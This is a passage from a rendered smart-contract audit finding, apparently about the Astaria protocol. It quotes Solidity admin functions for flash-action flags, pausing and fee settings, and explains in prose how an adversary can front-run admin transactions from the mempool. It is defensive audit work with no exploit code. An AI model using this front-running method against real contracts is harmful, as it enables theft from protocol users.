class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">206</span><span class=\"mtk1\">:   </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">file</span><span class=\"mtk1\">(</span><span class=\"mtk12\">File</span><span class=\"mtk1\"> </span><span class=\"mtk12\">calldata</span><span class=\"mtk1\"> </span><span class=\"mtk12\">incoming</span><span class=\"mtk1\">) </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">requiresAuth</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">207</span><span class=\"mtk1\">      </span><span class=\"mtk11\">_file</span><span class=\"mtk1\">(</span><span class=\"mtk12\">incoming</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">src</span><span class=\"mtk1\">\\</span><span class=\"mtk12\">LienToken</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">81</span><span class=\"mtk1\">  </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">82</span><span class=\"mtk1\">:   </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">file</span><span class=\"mtk1\">(</span><span class=\"mtk12\">File</span><span class=\"mtk1\"> </span><span class=\"mtk12\">calldata</span><span class=\"mtk1\"> </span><span class=\"mtk12\">incoming</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">requiresAuth</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">83</span><span class=\"mtk1\">      </span><span class=\"mtk12\">FileType</span><span class=\"mtk1\"> </span><span class=\"mtk12\">what</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">incoming</span><span class=\"mtk1\">.</span><span class=\"mtk12\">what</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p>However, adversary can front-run admin’s state up.</p>\n<p>Let me be specific, the adversay can front-run the admin’s disable flashAuction transaction.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"191\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_file</span><span class=\"mtk1\">(</span><span class=\"mtk12\">File</span><span class=\"mtk1\"> </span><span class=\"mtk12\">calldata</span><span class=\"mtk1\"> </span><span class=\"mtk12\">incoming</span><span class=\"mtk1\">) </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">CollateralStorage</span><span class=\"mtk1\"> </span><span class=\"mtk12\">storage</span><span class=\"mtk1\"> </span><span class=\"mtk12\">s</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">_loadCollateralSlot</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">FileType</span><span class=\"mtk1\"> </span><span class=\"mtk12\">what</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">incoming</span><span class=\"mtk1\">.</span><span class=\"mtk12\">what</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">bytes</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">data</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">incoming</span><span class=\"mtk1\">.</span><span class=\"mtk12\">data</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">what</span><span class=\"mtk1\"> == </span><span class=\"mtk12\">FileType</span><span class=\"mtk1\">.</span><span class=\"mtk12\">AstariaRouter</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">addr</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">abi</span><span class=\"mtk1\">.</span><span class=\"mtk11\">decode</span><span class=\"mtk1\">(</span><span class=\"mtk12\">data</span><span class=\"mtk1\">, (</span><span class=\"mtk12\">address</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">ASTARIA_ROUTER</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">IAstariaRouter</span><span class=\"mtk1\">(</span><span class=\"mtk12\">addr</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">} </span><span class=\"mtk15\">else</span><span class=\"mtk1\"> </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">what</span><span class=\"mtk1\"> == </span><span class=\"mtk12\">FileType</span><span class=\"mtk1\">.</span><span class=\"mtk12\">SecurityHook</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  (</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">target</span><span class=\"mtk1\">, </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">hook</span><span class=\"mtk1\">) = </span><span class=\"mtk12\">abi</span><span class=\"mtk1\">.</span><span class=\"mtk11\">decode</span><span class=\"mtk1\">(</span><span class=\"mtk12\">data</span><span class=\"mtk1\">, (</span><span class=\"mtk12\">address</span><span class=\"mtk1\">, </span><span class=\"mtk12\">address</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">securityHooks</span><span class=\"mtk1\">[</span><span class=\"mtk12\">target</span><span class=\"mtk1\">] = </span><span class=\"mtk12\">hook</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">} </span><span class=\"mtk15\">else</span><span class=\"mtk1\"> </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">what</span><span class=\"mtk1\"> == </span><span class=\"mtk12\">FileType</span><span class=\"mtk1\">.</span><span class=\"mtk12\">FlashEnabled</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  (</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">target</span><span class=\"mtk1\">, </span><span class=\"mtk12\">bool</span><span class=\"mtk1\"> </span><span class=\"mtk12\">enabled</span><span class=\"mtk1\">) = </span><span class=\"mtk12\">abi</span><span class=\"mtk1\">.</span><span class=\"mtk11\">decode</span><span class=\"mtk1\">(</span><span class=\"mtk12\">data</span><span class=\"mtk1\">, (</span><span class=\"mtk12\">address</span><span class=\"mtk1\">, </span><span class=\"mtk12\">bool</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">flashEnabled</span><span class=\"mtk1\">[</span><span class=\"mtk12\">target</span><span class=\"mtk1\">] = </span><span class=\"mtk12\">enabled</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<p>note the update:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"192\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">what</span><span class=\"mtk1\"> == </span><span class=\"mtk12\">FileType</span><span class=\"mtk1\">.</span><span class=\"mtk12\">FlashEnabled</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  (</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">target</span><span class=\"mtk1\">, </span><span class=\"mtk12\">bool</span><span class=\"mtk1\"> </span><span class=\"mtk12\">enabled</span><span class=\"mtk1\">) = </span><span class=\"mtk12\">abi</span><span class=\"mtk1\">.</span><span class=\"mtk11\">decode</span><span class=\"mtk1\">(</span><span class=\"mtk12\">data</span><span class=\"mtk1\">, (</span><span class=\"mtk12\">address</span><span class=\"mtk1\">, </span><span class=\"mtk12\">bool</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">flashEnabled</span><span class=\"mtk1\">[</span><span class=\"mtk12\">target</span><span class=\"mtk1\">] = </span><span class=\"mtk12\">enabled</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<p>If the admin submit a transaction to disable the target’s flashAction,</p>\n<p>The adversary can watch for the transaction in mempool, and once detecting the admin’s transaction and decode the parameter to see admin’s wants to disable his flashAction right,</p>\n<p>The adversary can submit the transaction with higher gas fee to perform flash action before the admin’s transaction is executed.</p>\n<p>Same type of front-running can be performed when adversary detects that the admin wants to pause the protocol. The adversary can front-run the pause transaction to deposit fund to mint more share from the vault, or commitTolLien to start a new loan term with NFT before the pause transactoin is executed.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"193\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/**</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">* </span><span class=\"mtk4\">@dev</span><span class=\"mtk3\"> Enables _pause, freezing functions with the whenNotPaused modifier.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">*/</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">__emergencyPause</span><span class=\"mtk1\">() </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">requiresAuth</span><span class=\"mtk1\"> </span><span class=\"mtk11\">whenNotPaused</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk11\">_pause</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<p>The adversary can in fact front-run the parameter setting update as well</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"194\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_file</span><span class=\"mtk1\">(</span><span class=\"mtk12\">File</span><span class=\"mtk1\"> </span><span class=\"mtk12\">calldata</span><span class=\"mtk1\"> </span><span class=\"mtk12\">incoming</span><span class=\"mtk1\">) </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">RouterStorage</span><span class=\"mtk1\"> </span><span class=\"mtk12\">storage</span><span class=\"mtk1\"> </span><span class=\"mtk12\">s</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">_loadRouterSlot</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">FileType</span><span class=\"mtk1\"> </span><span class=\"mtk12\">what</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">incoming</span><span class=\"mtk1\">.</span><span class=\"mtk12\">what</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">bytes</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">data</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">incoming</span><span class=\"mtk1\">.</span><span class=\"mtk12\">data</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">what</span><span class=\"mtk1\"> == </span><span class=\"mtk12\">FileType</span><span class=\"mtk1\">.</span><span class=\"mtk12\">AuctionWindow</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">window</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">windowBuffer</span><span class=\"mtk1\">) = </span><span class=\"mtk12\">abi</span><span class=\"mtk1\">.</span><span class=\"mtk11\">decode</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">data</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">auctionWindow</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">window</span><span class=\"mtk1\">.</span><span class=\"mtk11\">safeCastTo32</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">auctionWindowBuffer</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">windowBuffer</span><span class=\"mtk1\">.</span><span class=\"mtk11\">safeCastTo32</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    } </span><span class=\"mtk15\">else</span><span class=\"mtk1\"> </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">what</span><span class=\"mtk1\"> == </span><span class=\"mtk12\">FileType</span><span class=\"mtk1\">.</span><span class=\"mtk12\">LiquidationFee</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">numerator</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">denominator</span><span class=\"mtk1\">) = </span><span class=\"mtk12\">abi</span><span class=\"mtk1\">.</span><span class=\"mtk11\">decode</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">data</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">denominator</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">numerator</span><span class=\"mtk1\">) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">InvalidFileData</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">liquidationFeeNumerator</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">numerator</span><span class=\"mtk1\">.</span><span class=\"mtk11\">safeCastTo32</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">liquidationFeeDenominator</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">denominator</span><span class=\"mtk1\">.</span><span class=\"mtk11\">safeCastTo32</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    } </span><span class=\"mtk15\">else</span><span class=\"mtk1\"> </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">what</span><span class=\"mtk1\"> == </span><span class=\"mtk12\">FileType</span><span class=\"mtk1\">.</span><span class=\"mtk12\">ProtocolFee</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">numerator</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">denominator</span><span class=\"mtk1\">) = </span><span class=\"mtk12\">abi</span><span class=\"mtk1\">.</span><span class=\"mtk11\">decode</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">data</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">denominator</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">numerator</span><span class=\"mtk1\">) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">InvalidFileData</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">protocolFeeNumerator</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">numerator</span><span class=\"mtk1\">.</span><span class=\"mtk11\">safeCastTo32</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">protocolFeeDenominator</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">denominator</span><span class=\"mtk1\">.</span><span class=\"mtk11\">safeCastTo32</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    } </span><span class=\"mtk15\">else</span><span class=\"mtk1\"> </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">what</span><span class=\"mtk1\"> == </span><span class=\"mtk12\">FileType</span><span class=\"mtk1\">.</span><span class=\"mtk12\">BuyoutFee</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">numerator</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">denominator</span><span class=\"mtk1\">) = </span><span class=\"mtk12\">abi</span><span class=\"mtk1\">.</span><span class=\"mtk11\">decode</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">data</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">denominator</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">numerator</span><span class=\"mtk1\">) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">InvalidFileData</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">buyoutFeeNumerator</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">numerator</span><span class=\"mtk1\">.</span><span class=\"mtk11\">safeCastTo32</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">buyoutFeeDenominator</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">denominator</span><span class=\"mtk1\">.</span><span class=\"mtk11\">safeCastTo32</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    } </span><span class=\"mtk15\">else</span><span class=\"mtk1\"> </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">what</span><span class=\"mtk1\"> == </span><span class=\"mtk12\">FileType</span><span class=\"mtk1\">.</span><span class=\"mtk12\">MinInterestBPS</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">value</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">abi</span><span class=\"mtk1\">.</span><span class=\"mtk11\">decode</span><span class=\"mtk1\">(</span><span class=\"mtk12\">data</span><span class=\"mtk1\">, (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">minInterestBPS</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">value</span><span class=\"mtk1\">.</span><span class=\"mtk11\">safeCastTo32</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    } </span><span class=\"mtk15\">else</span><span class=\"mtk1\"> </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">what</span><span class=\"mtk1\"> == </span><span class=\"mtk12\">FileType</span><span class=\"mtk1\">.</span><span class=\"mtk12\">MinDurationIncrease</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">value</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">abi</span><span class=\"mtk1\">.</span><span class=\"mtk11\">decode</span><span class=\"mtk1\">(</span><span class=\"mtk12\">data</span><span class=\"mtk1\">, (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">minDurationIncrease</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">value</span><span class=\"mtk1\">.</span><span class=\"mtk11\">safeCastTo32</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    } </span><span class=\"mtk15\">else</span><span class=\"mtk1\"> </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">what</span><span class=\"mtk1\"> == </span><span class=\"mtk12\">FileType</span><span class=\"mtk1\">.</span><span class=\"mtk12\">MinEpochLength</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">minEpochLength</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">abi</span><span class=\"mtk1\">.</span><span class=\"mtk11\">decode</span><span class=\"mtk1\">(</span><span class=\"mtk12\">data</span><span class=\"mtk1\">, (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">)).</span><span class=\"mtk11\">safeCastTo32</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    } </span><span class=\"mtk15\">else</span><span class=\"mtk1\"> </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">what</span><span class=\"mtk1\"> == </span><span class=\"mtk12\">FileType</span><span class=\"mtk1\">.</span><span class=\"mtk12\">MaxEpochLength</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">maxEpochLength</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">abi</span><span class=\"mtk1\">.</span><span class=\"mtk11\">decode</span><span class=\"mtk1\">(</span><span class=\"mtk12\">data</span><span class=\"mtk1\">, (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">)).</span><span class=\"mtk11\">safeCastTo32</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    } </span><span class=\"mtk15\">else</span><span class=\"mtk1\"> </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">what</span><span class=\"mtk1\"> == </span><span class=\"mtk12\">FileType</span><span class=\"mtk1\">.</span><span class=\"mtk12\">MaxInterestRate</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">maxInterestRate</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">abi</span><span class=\"mtk1\">.</span><span class=\"mtk11\">decode</span><span class=\"mtk1\">(</span><span class=\"mtk12\">data</span><span class=\"mtk1\">, (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">)).</span><span class=\"mtk11\">safeCastTo88</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    } </span><span class=\"mtk15\">else</span><span class=\"mtk1\"> </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">what</span><span class=\"mtk1\"> == </span><span class=\"mtk12\">FileType</span><span class=\"mtk1\">.</span><span class=\"mtk12\">FeeTo</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">addr</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">abi</span><span class=\"mtk1\">.</span><span class=\"mtk11\">decode</span><span class=\"mtk1\">(</span><span class=\"mtk12\">data</span><span class=\"mtk1\">, (</span><span class=\"mtk12\">address</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">addr</span><span class=\"mtk1\"> == </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">)) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span 